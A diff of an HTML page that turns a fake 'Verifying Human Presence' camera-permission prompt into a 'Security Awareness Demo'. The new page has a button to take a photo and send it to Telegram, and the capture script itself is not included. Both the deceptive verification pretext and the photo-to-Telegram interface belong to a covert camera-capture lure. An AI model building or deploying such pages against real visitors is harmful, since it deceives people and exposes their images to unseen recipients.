@@ -1,17 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Check</title>
+    <title>Security Camera Demo</title>
     <style>
-        body { font-family: Arial; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        body { font-family: Arial; text-align: center; padding: 20px; background: #f0f0f0; }
         h1 { color: #333; }
-        .camera-placeholder { width: 300px; height: 300px; background: #ddd; margin: 20px auto; border-radius: 10px; line-height: 300px; color: #666; border: 2px dashed #aaa; }
+        .camera-box { 
+            width: 300px; 
+            height: 300px; 
+            background: #ddd; 
+            margin: 20px auto; 
+            border-radius: 10px; 
+            line-height: 300px; 
+            color: #666; 
+            border: 2px dashed #aaa;
+            overflow: hidden;
+        }
+        video, #screenshot-preview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover { background: #45a049; }
+        .warning { color: #666; font-size: 14px; margin-top: 20px; }
+        #status { color: #333; font-weight: bold; margin: 10px; }
     </style>
 </head>
 <body>
-    <h1>Verifying Human Presence</h1>
-    <div class="camera-placeholder">Camera Preview</div>
-    <p>Please allow camera access to complete verification.</p>
+    <h1>📸 Security Awareness Demo</h1>
+    <p>This demonstrates how websites request camera access</p>
+    
+    <div class="camera-box">
+        <video id="video" autoplay playsinline style="display: none;"></video>
+        <div id="placeholder">Camera Preview</div>
+        <img id="screenshot-preview" style="display: none;">
+    </div>
+    
+    <br>
+    <button id="startCamera">🔴 Click to Start Camera Demo</button>
+    <button id="takeScreenshot" style="display: none;">📸 Take Photo & Send to Telegram</button>
+    
+    <div id="status">Status: Waiting for your action</div>
+    <div class="warning">
+        ⚠️ Educational Purpose Only<br>
+        This shows why you should never grant camera access to unknown websites
+    </div>
+    
     <script src="script.js"></script>
 </body>
 </html>
